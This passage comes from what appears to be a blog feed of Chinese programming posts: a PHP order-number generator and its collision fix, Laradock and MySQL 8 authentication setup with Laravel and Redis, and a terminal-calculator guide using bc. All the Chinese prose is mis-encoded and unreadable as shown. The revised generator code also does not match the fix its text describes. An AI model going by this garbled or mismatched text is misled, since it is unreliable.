class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($orderNumber)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_numeric($orderNumber) <span class="keyword">or</span> <span class="number">11</span> !== strlen($orderNumber)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'Order number invalid.'</span>, <span class="number">1001</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ ¡éªŒæ—¥æœŸæ˜¯å¦éæ³•</span></span><br><span class="line">        [$year, $month, $day] = str_split(substr($orderNumber, <span class="number">0</span>, <span class="number">6</span>), <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!checkdate($month, $day, <span class="string">'20'</span> . $year)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $orderNumber[<span class="number">10</span>] == <span class="keyword">$this</span>-&gt;getCheckSum(substr($orderNumber, <span class="number">0</span>, <span class="number">10</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“è¿è¡Œäº†ä¸€æ®µæ—¶é—´åï¼Œæˆ‘ä»¬å‘ç°ä»¥ä¸Šä»£ç ä¼šæœ‰è®¢å•å†²çªçš„ç°è±¡ï¼Œæ¯”å¦‚ <code>generate(10001500, 2678)</code> ä¸ <code>generate(10001597, 2625)</code> ä¼šå¾—åˆ°ç›¸åŒçš„è®¢å•å·ï¼Œæ’æŸ¥ç”Ÿæˆè§„åˆ™åå‘ç°ï¼Œä¸¤ä¸ªç”¨æˆ· ID å–æ¨¡ç»“æœç›¸åŒã€ä»»åŠ¡ ID å–æ¨¡ç»“æœä¹Ÿç›¸åŒï¼Œæ‰€ä»¥å¯¼è‡´äº†æœ€ç»ˆçš„è®¢å•å·ç›¸åŒã€‚è¿›ä¸€æ­¥æ€è€ƒåå‘ç°ï¼Œåªè¦ ID å·®å€¼ä¸ºæ¨¡å€¼ï¼Œå°±ä¼šåœ¨å–æ¨¡åå¾—åˆ°ç›¸åŒçš„ç»“æœï¼Œå› æ­¤å¯¹å–æ¨¡ç»“æœåŠ å…¥å¼‚æˆ–éšæœºæ•°çš„è¿ç®—ï¼Œç›¸å…³ä»£ç å˜æ›´å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generate</span><span class="params">($userId, $taskId)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $date = date(<span class="string">'ymd'</span>);</span><br><span class="line">    $user = mt_rand(<span class="number">0</span>, <span class="number">99</span>);</span><br><span class="line">    $task = mt_rand(<span class="number">0</span>, <span class="number">99</span>);</span><br><span class="line"></span><br><span class="line">    $checksum = <span class="keyword">$this</span>-&gt;getCheckSum($date . $user . $task);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $date . $user . $task . $checksum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ol><li><a href="https://www.jianshu.com/p/792c2bbe107e" target="_blank" rel="noopener">Laravel â€“ å®æˆ˜ç¯‡ UUID (å”¯ä¸€è¯†åˆ«ç )</a></li><li><a href="https://www.zhihu.com/question/19805896" target="_blank" rel="noopener">ç”µå­å•†åŠ¡ç½‘ç«™ä¸­è®¢å•å·è®¾è®¡æœ‰ä»€ä¹ˆè§„åˆ™å’Œä¾æ®å—ï¼Ÿ</a></li><li><a href="https://yemablog.com/posts/how-to-generate-id" target="_blank" rel="noopener">äº’è”ç½‘ä¸šåŠ¡ä¸­ç”¨æˆ·ã€å•†å®¶ã€è®¢å•å·ç­‰ id å¦‚ä½•ç”Ÿæˆ</a></li><li><a href="https://yemablog.com/posts/jd-id" target="_blank" rel="noopener">äº¬ä¸œçš„è®¢å•å·ä¸ºä»€ä¹ˆé‚£ä¹ˆçŸ­ï¼Ÿ</a></li><li><a href="https://www.jianshu.com/p/544ab3d60e77" target="_blank" rel="noopener">ç”µå•†è®¢å•å·è®¾è®¡æ€è€ƒ</a></li><li><a href="https://tech.meituan.com/2017/04/21/mt-leaf.html" target="_blank" rel="noopener">Leafâ€”â€” ç¾å›¢ç‚¹è¯„åˆ†å¸ƒå¼ ID ç”Ÿæˆç³»ç»Ÿ</a></li><li><a href="https://crazyfzw.github.io/2018/07/21/unique-id-generate/" target="_blank" rel="noopener">åˆ†å¸ƒå¼ç³»ç»Ÿå…¨å±€å”¯ä¸€ ID ç”Ÿæˆæ–¹æ¡ˆ</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Laradock ä¸ MySQL 8.0 å†é™©è®°</title>
      <link href="/post/Laradock-and-MySQL-8/"/>
      <url>/post/Laradock-and-MySQL-8/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1gax36xnansj30k40bnmy1.jpg" alt=""></p><a id="more"></a><h1 id="Laradock-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#Laradock-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="Laradock æ˜¯ä»€ä¹ˆï¼Ÿ"></a>Laradock æ˜¯ä»€ä¹ˆï¼Ÿ</h1><p><a href="http://laradock.io/" target="_blank" rel="noopener">Laradock</a> æ˜¯ä¸€ä¸ª PHP çš„ docker é›†æˆç¯å¢ƒï¼Œæ”¯æŒå¤šç§ PHPã€DBåŠå¸¸ç”¨å·¥å…·ç‰ˆæœ¬ï¼Œèƒ½å¤Ÿå¿«é€Ÿæ­å»ºå¼€å‘ç”Ÿäº§ç¯å¢ƒã€‚</p><h2 id="Laradock-é…ç½®è¯´æ˜"><a href="#Laradock-é…ç½®è¯´æ˜" class="headerlink" title="Laradock é…ç½®è¯´æ˜"></a>Laradock é…ç½®è¯´æ˜</h2><h3 id="å®¹å™¨æ“ä½œ"><a href="#å®¹å™¨æ“ä½œ" class="headerlink" title="å®¹å™¨æ“ä½œ"></a>å®¹å™¨æ“ä½œ</h3><h4 id="å¯åŠ¨å®¹å™¨"><a href="#å¯åŠ¨å®¹å™¨" class="headerlink" title="å¯åŠ¨å®¹å™¨"></a>å¯åŠ¨å®¹å™¨</h4><p>åœ¨ laradock æ ¹ç›®å½•è®¾ç½®å¥½<code>.env</code>æ–‡ä»¶åï¼Œæ‰§è¡Œå‘½ä»¤<code>docker-compose up -d nginx mysql redis workspace</code>å¯åŠ¨æ‰€éœ€å®¹å™¨</p><blockquote><p>docker-compose å‘½ä»¤ä¼šä¾èµ–<code>docker-compose.yml</code>æ–‡ä»¶ã€‚</p></blockquote><h4 id="åœæ­¢å®¹å™¨"><a href="#åœæ­¢å®¹å™¨" class="headerlink" title="åœæ­¢å®¹å™¨"></a>åœæ­¢å®¹å™¨</h4><p>åœ¨ laradock æ ¹ç›®å½•æ‰§è¡Œ<code>docker-compose stop</code><br>åœ¨ä»»æ„ç›®å½•æ‰§è¡Œ<code>docker stop $(docker ps -q)</code>ä¼šåœæ­¢æ‰€æœ‰æ­£åœ¨è¿è¡Œä¸­çš„å®¹å™¨</p><h4 id="åœæ­¢å¹¶åˆ é™¤å®¹å™¨"><a href="#åœæ­¢å¹¶åˆ é™¤å®¹å™¨" class="headerlink" title="åœæ­¢å¹¶åˆ é™¤å®¹å™¨"></a>åœæ­¢å¹¶åˆ é™¤å®¹å™¨</h4><p>åœ¨ laradock æ ¹ç›®å½•æ‰§è¡Œ<code>docker-compose down</code></p><blockquote><p>è¯·<em>è°¨æ…</em>ä½¿ç”¨è¯¥å‘½ä»¤ ï¼ï¼ï¼</p></blockquote><h4 id="è¿›å…¥å®¹å™¨"><a href="#è¿›å…¥å®¹å™¨" class="headerlink" title="è¿›å…¥å®¹å™¨"></a>è¿›å…¥å®¹å™¨</h4><p>åœ¨ <strong>laradock ç›®å½•ä¸‹</strong> æ‰§è¡Œ<code>docker-compose exec [container] bash</code>å‘½ä»¤ï¼Œå¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose <span class="built_in">exec</span> workspace bash      // è¿›å…¥å·¥ä½œåŒº</span><br><span class="line">$ docker-compose <span class="built_in">exec</span> mysql bash          // è¿›å…¥ MySQL</span><br><span class="line">$ docker-compose <span class="built_in">exec</span> redis bash          // è¿›å…¥ Redis</span><br></pre></td></tr></table></figure><h4 id="æ„å»ºå®¹å™¨"><a href="#æ„å»ºå®¹å™¨" class="headerlink" title="æ„å»ºå®¹å™¨"></a>æ„å»ºå®¹å™¨</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose <span class="keyword">build </span>workspace</span><br><span class="line">$ docker-compose <span class="keyword">build </span>mysql</span><br></pre></td></tr></table></figure><h3 id="Nginx-ç«™ç‚¹é…ç½®"><a href="#Nginx-ç«™ç‚¹é…ç½®" class="headerlink" title="Nginx ç«™ç‚¹é…ç½®"></a>Nginx ç«™ç‚¹é…ç½®</h3><p>ä½äº laradock æ ¹ç›®å½•ä¸‹çš„<code>../nginx/sites/*.conf</code></p><h1 id="ä¸ºä»€ä¹ˆé€‰æ‹©-MySQL-8ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆé€‰æ‹©-MySQL-8ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆé€‰æ‹© MySQL 8ï¼Ÿ"></a>ä¸ºä»€ä¹ˆé€‰æ‹© MySQL 8ï¼Ÿ</h1><p>MySQL 8.0 äº 2016 å¹´ 9 æœˆå‘å¸ƒï¼Œåœ¨ 2018 å¹´ 4 æœˆå‘å¸ƒç¬¬ä¸€ä¸ªé€šç”¨å¯ç”¨ç‰ˆæœ¬ã€‚ç›®å‰ä¸ºæ­¢ï¼ŒMySQL8 çš„ä½¿ç”¨è¿˜å¤„äºå°èŒƒå›´çš„å°é²œé˜¶æ®µï¼Œç»è¿‡è¿‘ä¸¤å¹´çš„æ­£å¼ç‰ˆï¼Œæˆ‘ä»»åŠ¡å¾ˆå¤šäººå·²ç»è¶Ÿè¿‡ä¸å°‘å‘äº†ï¼ŒåŠ ä¹‹å‡çº§æ˜¯æœªæ¥çš„è¶‹åŠ¿ï¼Œä¸å¦‚æ—©æ—¥é€‚åº”ã€‚<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gax44awxg8j30d90cr77b.jpg" alt=""></p><p>åœ¨ MySQL 8 ä¸­ï¼Œä¸»è¦æœ‰ä»¥ä¸‹çš„ä¸€äº›ä¼˜åŒ–ï¼š</p><ul><li>å­—ç¬¦é›†é»˜è®¤æ”¯æŒ uft8mb4ï¼Œå¾ˆå¥½çš„æ”¯æŒäº† emojiï¼Œå†ä¹Ÿä¸æ˜¯ latin1 äº†</li><li>æ–°èƒ½è¾ƒ 5.7 æå‡äº†ä¸¤å€</li><li>JSON çš„ä¼˜åŒ–æ”¯æŒ</li><li>è¿æ¥æ–¹å¼ç”± <code>mysql_native_password</code> ä¿®æ”¹ä¸º <code>caching_sha2_password</code></li><li>â€¦</li></ul><h1 id="Laravel-é…ç½®è¯´æ˜"><a href="#Laravel-é…ç½®è¯´æ˜" class="headerlink" title="Laravel é…ç½®è¯´æ˜"></a>Laravel é…ç½®è¯´æ˜</h1><h2 id="Laravel-è¿æ¥-Laradock-æ•°æ®åº“"><a href="#Laravel-è¿æ¥-Laradock-æ•°æ®åº“" class="headerlink" title="Laravel è¿æ¥ Laradock æ•°æ®åº“"></a>Laravel è¿æ¥ Laradock æ•°æ®åº“</h2><p><code>.env</code>æ–‡ä»¶éœ€é…ç½®ä¸º<code>DB_HOST=mysql</code>ï¼Œä¸èƒ½æ˜¯<code>127.0.0.1</code>æˆ–<code>localhost</code>ã€‚å¦‚æœéœ€ä½¿ç”¨æ•°æ®åº“è½¯ä»¶è¿æ¥ï¼Œéœ€ä¿®æ”¹ä¸ºhost å¯ä¸º<code>127.0.0.1</code>æˆ–<code>localhost</code>ã€‚</p><p>è¿™æ˜¯å› ä¸º<code>127.0.0.1</code>æˆ–<code>localhost</code>è¡¨ç¤ºæœ¬æœºå›ç¯åœ°å€ï¼Œphp ä»£ç æ˜¯è¿è¡Œåœ¨ php å®¹å™¨ä¸­çš„ï¼Œä¸ MySQL å®¹å™¨ç›¸éš”ç¦»ï¼Œå› æ­¤éœ€è¦è®¾ä¸º<code>mysql</code>ã€‚MySQL å®¹å™¨ä¸æ•°æ®åº“è½¯ä»¶è¿è¡ŒäºåŒä¸€å®¿ä¸»æœºç¯å¢ƒï¼Œå› æ­¤å¯ç”¨<code>127.0.0.1</code>æˆ–<code>localhost</code>ã€‚</p><h3 id="MySQL-8-çš„è®¤è¯å˜åŒ–"><a href="#MySQL-8-çš„è®¤è¯å˜åŒ–" class="headerlink" title="MySQL 8 çš„è®¤è¯å˜åŒ–"></a>MySQL 8 çš„è®¤è¯å˜åŒ–</h3><p>MySQL 8.0 å°†å¯†ç éªŒè¯æ–¹å¼ç”±ä»¥å‰çš„ <code>mysql_native_password</code> æ”¹ä¸ºäº† <code>caching_sha2_password</code>ï¼Œä»¥è·å¾—æ›´å¿«çš„è¿æ¥é€Ÿåº¦ï¼Œä½†ç›®å‰<code>caching_sha2_password</code>çš„æ”¯æŒå°šä¸å®Œå–„ï¼Œå› æ­¤è¿æ¥æ—¶å¯èƒ½ä¼šå‡ºç°è®¤è¯é”™è¯¯ã€‚</p><p>PHP 7.4 ç‰ˆæœ¬å·²ç»æ”¯æŒäº† <code>caching_sha2_password</code>ï¼Œå› æ­¤å¯ä»¥ç›´æ¥è¿æ¥ï¼Œè¯¥ç‰ˆæœ¬ä»¥ä¸‹åˆ™éœ€è¦ä½¿ç”¨å‘½ä»¤<code>ALTER USER &#39;YOURUSERNAME&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;YOURPASSWORD&#39;;</code>ä¿®æ”¹è´¦æˆ·çš„è¿æ¥æ–¹å¼ã€‚ä¿®æ”¹å‰å¯ä½¿ç”¨å‘½ä»¤<code>SELECT user,host,plugin from mysql.user where user=&#39;root&#39;;</code>æŸ¥è¯¢å½“å‰è¿æ¥æ–¹å¼ã€‚</p><p>å¦å¤–ï¼Œå½“å‰å¤§å¤šæ•°æ®åº“GUIå®¢æˆ·ç«¯å°šä¸æ”¯æŒ <code>caching_sha2_password</code> æ–¹å¼ï¼Œå› æ­¤éœ€è¦å°† DB è½¯ä»¶çš„è¿æ¥è´¦å·è®¾ç½®ä¸ºä¼ ç»Ÿçš„ <code>mysql_native_password</code>ã€‚æˆ–è€…ä½¿ç”¨ç»ˆç«¯è¿æ¥æ•°æ®åº“æŸ¥è¯¢ï¼Œç»ˆç«¯æŸ¥è¯¢æ¨è mycli å·¥å…·ï¼Œä»¥ä¸‹æ˜¯ä½¿ç”¨ç¤ºä¾‹</p><p><img src="https://d33wubrfki0l68.cloudfront.net/0f0733732e766219aa0a83e631d5cd8b784edabc/5dc57/images/main.gif" alt=""></p><p>ç”±äºä»£ç è¿è¡Œäº Laradock çš„ workspace å®¹å™¨ï¼Œå› æ­¤å½“æˆ‘ä»¬åœ¨å®¿ä¸»æœºæ‰§è¡Œæ¶‰åŠæ•°æ®åº“çš„ç»ˆç«¯å‘½ä»¤æ—¶ï¼Œä¼šå‡ºç°çŸ›ç›¾çš„æƒ…å†µï¼š</p><ol><li>ä»£ç ä»¥<code>DB_HOST=mysql</code>è¿æ¥æ•°æ®åº“ï¼Œå®¿ä¸»æœºåˆ™ä»¥<code>127.0.0.1</code>è¿æ¥ï¼Œå› æ­¤ dsn é”™è¯¯è€Œæ— æ³•è¿æ¥ï¼Œéœ€è¦ä¸´æ—¶ä¿®æ”¹<code>DB_HOST</code>ï¼Œä½†è¿™æ ·å®¹æ˜“å¿˜è®°æ”¹å›å»ï¼Œä¸å»ºè®®æ“ä½œ</li><li>æ‰§è¡Œä¸­ä¸€äº›ä¾èµ–ç›®å½•çš„ä»£ç åœ¨å®¿ä¸»æœºå¯èƒ½ä¼šæ— æ³•æ­£å¸¸è¿è¡Œ<br>ç»¼ä¸Šï¼Œå®¹å™¨ä¸­æ‰§è¡Œç»ˆç«¯è„šæœ¬æ—¶éœ€è¦åœ¨å®¹å™¨ä¸­æ‰§è¡Œï¼Œè¯·å‹¿åœ¨å®¿ä¸»æœºä¸­æ‰§è¡Œã€‚</li></ol><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ol><li><a href="https://laravel-news.com/laravel-and-mysql-8-fixing-mysql-server-has-gone-away-error" target="_blank" rel="noopener">PHP 7.4 ä¿®å¤ MySQL 8 è¿æ¥é—®é¢˜</a></li><li><a href="https://dev.mysql.com/doc/refman/8.0/en/caching-sha2-pluggable-authentication.html" target="_blank" rel="noopener">MySQL 8 è¿æ¥å˜æ›´çš„å®˜æ–¹è¯´æ˜</a></li></ol><h2 id="è¿æ¥-Redis"><a href="#è¿æ¥-Redis" class="headerlink" title="è¿æ¥ Redis"></a>è¿æ¥ Redis</h2><p>Laravel Redis ä¾èµ– predis æˆ–è€… phpredisï¼Œå‰è€…çº¯ php ç¼–å†™ï¼Œcomposer å¿«æ·å®‰è£…ï¼Œä½†ä½œè€…å·²ç»å¼ƒå‘ï¼Œæœªæ¥Laravel ä¼šç§»é™¤å¯¹å…¶æ”¯æŒï¼Œé‡‡ç”¨ socket è¿æ¥åˆ° Redisï¼ˆæ¯æ¬¡è¯·æ±‚å‡éœ€è¿æ¥ Redisï¼‰ï¼Œåè€…åˆ™æ˜¯ä½¿ç”¨ C è¯­è¨€ç¼–å†™çš„æ‰©å±•ï¼Œå¯ä»¥ä¿æŒå¯¹ Redis çš„é•¿è¿æ¥ï¼ˆpconnectï¼‰ï¼Œå…·å¤‡æ›´å¥½çš„æ€§èƒ½ï¼Œå› æ­¤è‹¥ä¸šåŠ¡å¯¹ Redis ä¾èµ–æ€§è¾ƒå¼ºï¼Œæ¨èä½¿ç”¨ phpredisã€‚</p><h3 id="Laravel-ä¸­çš„-Redis-æ³¨æ„äº‹é¡¹"><a href="#Laravel-ä¸­çš„-Redis-æ³¨æ„äº‹é¡¹" class="headerlink" title="Laravel ä¸­çš„ Redis æ³¨æ„äº‹é¡¹"></a>Laravel ä¸­çš„ Redis æ³¨æ„äº‹é¡¹</h3><p>Laravel çš„<code>config/database.php</code>ä¸­é»˜è®¤ä½¿ç”¨<code>phpredis</code>ï¼Œè‹¥ä½¿ç”¨<code>predis</code>ï¼Œåˆ™æ³¨æ„éœ€è¦ä¿®æ”¹<code>REDIS_CLIENT</code>ã€‚</p><p>Laravel ä¸­ç»Ÿä¸€ä½¿ç”¨<code>Illuminate\Support\Facades\Redis</code>ä¸­çš„å‘½ä»¤ï¼Œå±è”½äº† predis ä¸ phpredis å‘½ä»¤çš„å·®å¼‚ï¼Œå»ºè®®ä½¿ç”¨ã€‚</p><h3 id="predis-ç›´æ¥è¿æ¥"><a href="#predis-ç›´æ¥è¿æ¥" class="headerlink" title="predis ç›´æ¥è¿æ¥"></a>predis ç›´æ¥è¿æ¥</h3><p>predis çš„<code>new Predis\Client();</code>æ˜¯ä½¿ç”¨<code>tcp://127.0.0.1:6379</code>é»˜è®¤è¿æ¥ï¼Œè€Œéè¯»å– Laravel çš„Redisé…ç½®ï¼Œé»˜è®¤é…ç½®ä¿¡æ¯ä½äº<code>src/Connection/Parameters.php</code>ä¸­çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> $defaults = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'scheme'</span> =&gt; <span class="string">'tcp'</span>,</span><br><span class="line">        <span class="string">'host'</span> =&gt; <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'port'</span> =&gt; <span class="number">6379</span>,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>å¦‚æœè¿æ¥éæœ¬æœº Redisï¼Œå¯ä½¿ç”¨<code>new Predis\Client(&#39;tcp://10.0.0.1:6379&#39;);</code>è¿æ¥ã€‚</p><h2 id="å¸¸è§é”™è¯¯"><a href="#å¸¸è§é”™è¯¯" class="headerlink" title="å¸¸è§é”™è¯¯"></a>å¸¸è§é”™è¯¯</h2><h3 id="å®¿ä¸»æœºæ‰§è¡Œä¸æ•°æ®åº“ç›¸å…³å‘½ä»¤æ—¶é‡åˆ°ä»¥ä¸‹é”™è¯¯ï¼š"><a href="#å®¿ä¸»æœºæ‰§è¡Œä¸æ•°æ®åº“ç›¸å…³å‘½ä»¤æ—¶é‡åˆ°ä»¥ä¸‹é”™è¯¯ï¼š" class="headerlink" title="å®¿ä¸»æœºæ‰§è¡Œä¸æ•°æ®åº“ç›¸å…³å‘½ä»¤æ—¶é‡åˆ°ä»¥ä¸‹é”™è¯¯ï¼š"></a>å®¿ä¸»æœºæ‰§è¡Œä¸æ•°æ®åº“ç›¸å…³å‘½ä»¤æ—¶é‡åˆ°ä»¥ä¸‹é”™è¯¯ï¼š</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\<span class="keyword">Database</span>\QueryException  : <span class="built_in">SQLSTATE</span>[HY000] [<span class="number">2002</span>] php_network_getaddresses: getaddrinfo failed: nodename nor servname provided, <span class="keyword">or</span> <span class="keyword">not</span> known</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ç”±äºå®¿ä¸»æœºæ— æ³•æ­£ç¡®è¿æ¥å®¹å™¨ä¸­çš„æ•°æ®åº“ï¼Œè¯·å‰å¾€å®¹å™¨ä¸­æ‰§è¡Œ</p><h3 id="æ•°æ®åº“è¿æ¥æŠ¥é”™"><a href="#æ•°æ®åº“è¿æ¥æŠ¥é”™" class="headerlink" title="æ•°æ®åº“è¿æ¥æŠ¥é”™"></a>æ•°æ®åº“è¿æ¥æŠ¥é”™</h3><p>ä½¿ç”¨ä»¥ä¸‹ä»£ç ç›´æ¥è¿æ¥æ•°æ®åº“éªŒè¯æ˜¯å¦ DB é…ç½®é”™è¯¯ï¼Œç„¶åæ ¹æ®é”™è¯¯æç¤ºå€ŸåŠ©æœç´¢å¼•æ“é€æ­¥æ’æŸ¥é”™è¯¯</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$db_test = mysqli_connect(<span class="string">'host'</span>, <span class="string">'username'</span>, <span class="string">'password'</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç»ˆç«¯è®¡ç®—å™¨</title>
      <link href="/post/terminal-calculator/"/>
      <url>/post/terminal-calculator/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1garaul1518j30sg0g0wff.jpg" alt=""></p><a id="more"></a><p>ç¼–ç¨‹ä¸­ç»å¸¸ä¼šæœ‰ä¸€äº›æ•°å€¼çš„è®¡ç®—æˆ–è€…è¿›åˆ¶çš„è½¬æ¢ï¼Œè™½ç„¶å„æ“ä½œç³»ç»Ÿéƒ½è‡ªå¸¦äº†è®¡ç®—å™¨åº”ç”¨ï¼Œä½†éƒ¨åˆ†åŠŸèƒ½è¿˜æ˜¯ä¸ç®—å®Œå–„ï¼Œæ¯”å¦‚å–ä½™æ•°ã€è¿›åˆ¶è½¬æ¢ã€å¼•ç”¨ä¸Šæ¬¡çš„è®¡ç®—ç»“æœç­‰ï¼Œç›¸è¾ƒè€Œè¨€ï¼ŒWindows ä¸­çš„è®¡ç®—å™¨åº”ç”¨è¿˜æ˜¯åŠŸèƒ½å¾ˆå¼ºå¤§çš„ã€‚å…¶å®ï¼Œä½œä¸ºè®¡ç®—æœºï¼Œè®¡ç®—åŠŸèƒ½å½“ç„¶æ˜¯å…¶æœ€åŸºç¡€ä¹Ÿæ˜¯æœ€æ“…é•¿çš„åŠŸèƒ½ï¼Œä»…ç»ˆç«¯å°±æ¶µç›–äº†å„ç§å„æ ·çš„è®¡ç®—æ–¹å¼ï¼Œå¦‚<code>bc</code>ã€<code>echo</code>ã€<code>expr</code>ç­‰</p><h1 id="bc"><a href="#bc" class="headerlink" title="bc"></a>bc</h1><h2 id="åŸºç¡€è¿ç®—"><a href="#åŸºç¡€è¿ç®—" class="headerlink" title="åŸºç¡€è¿ç®—"></a>åŸºç¡€è¿ç®—</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> 15/4 | bc</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"3+4; 5*2; 5^2; 18/4"</span> | bc</span><br></pre></td></tr></table></figure><h2 id="è¿›åˆ¶è½¬æ¢"><a href="#è¿›åˆ¶è½¬æ¢" class="headerlink" title="è¿›åˆ¶è½¬æ¢"></a>è¿›åˆ¶è½¬æ¢</h2><p>åå…­è¿›åˆ¶è½¬åè¿›åˆ¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"ibase=16;A7"</span> | bc</span><br><span class="line">167</span><br></pre></td></tr></table></figure><p>äºŒè¿›åˆ¶è½¬åè¿›åˆ¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"ibase=2;11111111"</span> | bc</span><br><span class="line">255</span><br></pre></td></tr></table></figure><p>åå…­è¿›åˆ¶è½¬äºŒè¿›åˆ¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"ibase=16; obase=2; B5-A4"</span> | bc</span><br><span class="line">10001</span><br></pre></td></tr></table></figure><h2 id="last-å¼•ç”¨ä¸Šæ¬¡è®¡ç®—ç»“æœ"><a href="#last-å¼•ç”¨ä¸Šæ¬¡è®¡ç®—ç»“æœ" class="headerlink" title="last å¼•ç”¨ä¸Šæ¬¡è®¡ç®—ç»“æœ"></a>last å¼•ç”¨ä¸Šæ¬¡è®¡ç®—ç»“æœ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"50*4; last+100"</span> | bc </span><br><span class="line">200</span><br><span class="line">300</span><br></pre></td></tr></table></figure><p><code>last</code> ä¹Ÿå¯ä»¥ç”¨<code>.</code>ä»£æ›¿</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"50*4;.+100"</span> | bc</span></span><br></pre></td></tr></table></figure><h2 id="äº¤äº’å¼è®¡ç®—"><a href="#äº¤äº’å¼è®¡ç®—" class="headerlink" title="äº¤äº’å¼è®¡ç®—"></a>äº¤äº’å¼è®¡ç®—</h2><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gar9jdt3bsj30fr050weu.jpg" alt=""></p><p>ä¸€è¡Œå¤šä¸ªè®¡ç®—è¡¨è¾¾å¼ï¼Œä»¥<code>;</code>åˆ†éš”</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>+<span class="number">4</span>; <span class="number">5</span>*<span class="number">2</span>; <span class="number">5</span>^<span class="number">2</span>; <span class="number">18</span>/<span class="number">4</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">25</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure><h1 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> $((3+5))</span><br><span class="line">$ <span class="built_in">echo</span> $(((3+5)*2))</span><br><span class="line">$ <span class="built_in">echo</span> `date +%Y%m%d`</span><br></pre></td></tr></table></figure><h1 id="expr"><a href="#expr" class="headerlink" 